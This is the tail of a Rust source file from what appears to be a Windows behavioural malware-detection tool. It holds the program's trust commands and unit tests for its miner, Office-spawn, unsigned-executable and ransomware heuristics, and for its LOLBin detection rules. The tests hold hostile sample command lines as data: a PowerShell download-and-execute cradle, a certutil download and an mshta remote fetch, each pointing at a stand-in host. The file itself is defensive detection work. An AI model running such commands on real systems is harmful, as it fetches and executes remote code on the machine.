            let _ = fs::write(d.join("behavior_alerts.json"), serde_json::to_vec(&*g).unwrap_or_default());
        }
    }
}

/// Доверять программе: её больше не разбирают правила (по пути и по имени процесса).
#[tauri::command]
pub fn bh_trust(app: AppHandle, path: Option<String>, name: Option<String>) {
    let mut s = load_settings(&app);
    for v in [path, name.map(|n| stem(&n))].into_iter().flatten() {
        if !v.is_empty() && !s.trusted.contains(&v) {
            s.trusted.push(v);
        }
    }
    save_settings(&app, &s);
}

#[tauri::command]
pub fn bh_untrust(app: AppHandle, value: String) {
    let mut s = load_settings(&app);
    s.trusted.retain(|t| *t != value);
    save_settings(&app, &s);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(name: &str, exe: &str, cmd: &str, parent: &str, cpu: f32) -> Sample {
        Sample { pid: 100, name: name.into(), exe: exe.into(), cmd: cmd.into(), parent_name: parent.into(), cpu_total: cpu, ..Default::default() }
    }

    #[test]
    fn lolbin_rules() {
        assert!(lolbin_abuse("powershell.exe", "powershell -NoProfile -NonInteractive -EncodedCommand SQBFAFgA").is_none());
        assert!(lolbin_abuse("powershell.exe", "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex").is_some());
        assert!(lolbin_abuse("powershell.exe", "powershell Get-ChildItem").is_none());
        assert!(lolbin_abuse("certutil.exe", "certutil -urlcache -f http://x/a.exe a.exe").is_some());
        assert!(lolbin_abuse("certutil.exe", "certutil -hashfile a.exe SHA256").is_none());
        assert!(lolbin_abuse("mshta.exe", "mshta http://x/a.hta").is_some());
        assert!(lolbin_abuse("notepad.exe", "notepad a.txt").is_none());
    }

    #[test]
    fn repeated_lolbin_from_new_pids_is_throttled() {
        let mut ev = Evaluator::default();
        let ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        let mut run = |pid| {
            let mut x = s("powershell.exe", ps, "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex", "node.exe", 1.0);
            x.pid = pid;
            ev.evaluate(&x)
        };
        assert_eq!(run(1).len(), 1);
        // каждый вызов — новый PID, но это та же программа и то же правило: второй тост не нужен
        for pid in 2..30 {
            assert!(run(pid).is_empty());
        }
        let mut cert = s("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -f http://x/a.exe a.exe", "cmd.exe", 1.0);
        cert.pid = 31;
        assert_eq!(ev.evaluate(&cert).len(), 1); // другая программа — свой тост
    }

    #[test]
    fn office_chain() {
        assert!(office_spawn("WINWORD.EXE", "powershell.exe"));
        assert!(office_spawn("excel.exe", "cmd.exe"));
        assert!(!office_spawn("explorer.exe", "cmd.exe"));
        assert!(!office_spawn("winword.exe", "chrome.exe"));
    }

    #[test]
    fn miner_needs_signature_and_time() {
        let mut ev = Evaluator::default();
        let exe = "C:\\Users\\a\\AppData\\Roaming\\svc\\svchost32.exe";
        ev.signed.insert(lower(exe), false);
        let sample = s("svchost32.exe", exe, "", "explorer.exe", 40.0);
        // меньше окна — молчим
        for _ in 0..CPU_WINDOW - 1 {
            assert!(ev.evaluate(&sample).is_empty());
        }
        let alerts = ev.evaluate(&sample);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].rule, "miner-cpu");
        assert_eq!(alerts[0].severity, "high"); // из AppData
        assert!(ev.evaluate(&sample).is_empty()); // повторно не шумим
    }

    #[test]
    fn signed_or_known_heavy_programs_are_ignored() {
        let mut ev = Evaluator::default();
        ev.signed.insert(lower("C:\\Games\\game.exe"), true);
        let game = s("game.exe", "C:\\Games\\game.exe", "", "explorer.exe", 80.0);
        for _ in 0..CPU_WINDOW + 5 {
            assert!(ev.evaluate(&game).is_empty());
        }
        let mut ev2 = Evaluator::default();
        ev2.signed.insert(lower("C:\\x\\ffmpeg.exe"), false);
        let ff = s("ffmpeg.exe", "C:\\x\\ffmpeg.exe", "", "cmd.exe", 90.0);
        for _ in 0..CPU_WINDOW + 5 {
            assert!(ev2.evaluate(&ff).is_empty());
        }
    }

    #[test]
    fn trusted_is_ignored() {
        let mut ev = Evaluator::default();
        ev.trusted.insert("c:\\tools\\crunch.exe".into());
        let mut x = s("crunch.exe", "C:\\Tools\\crunch.exe", "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex", "explorer.exe", 90.0);
        x.name = "powershell.exe".into();
        assert!(ev.evaluate(&x).is_empty());
    }

    #[test]
    fn unsigned_from_temp() {
        let mut ev = Evaluator::default();
        let exe = "C:\\Users\\a\\AppData\\Local\\Temp\\x.exe";
        let mut sample = s("x.exe", exe, "", "explorer.exe", 1.0);
        sample.is_new = true;
        assert!(ev.needs_signature(&sample));
        ev.signed.insert(lower(exe), false);
        let alerts = ev.evaluate(&sample);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].rule, "unsigned-temp");
    }

    #[test]
    fn rule_groups_cover_known_rules() {
        assert_eq!(rules_of_group("miner"), &["miner-cpu"]);
        assert!(rules_of_group("scripts").contains(&"lolbin"));
        assert!(rules_of_group("nope").is_empty());
        let s: Settings = serde_json::from_str("{}").unwrap();
        assert!(s.enabled && s.realtime && s.auto_quarantine && s.disabled_rules.is_empty());
    }

    #[test]
    fn ransomware_heuristics() {
        let mut w = RansomWatch::default();
        let t = Instant::now();
        assert!(w.push("C:\\Users\\a\\Documents\\a.docx", true, t).is_none());
        assert_eq!(w.push("C:\\Users\\a\\Documents\\HOW_TO_DECRYPT.txt", false, t).unwrap().0, "critical");
        assert_eq!(w.push("C:\\Users\\a\\Documents\\b.docx.lockbit", false, t).unwrap().0, "critical");
        let mut w2 = RansomWatch::default();
        let mut fired = None;
        for i in 0..60 {
            fired = w2.push(&format!("C:\\Users\\a\\Documents\\f{i}.xyz"), true, t);
        }
        assert_eq!(fired.unwrap().0, "high");
        // обычное копирование (без переименований) не считается
        let mut w3 = RansomWatch::default();
        for i in 0..300 {
            assert!(w3.push(&format!("C:\\Users\\a\\Documents\\c{i}.docx"), false, t).is_none());
        }
    }
}
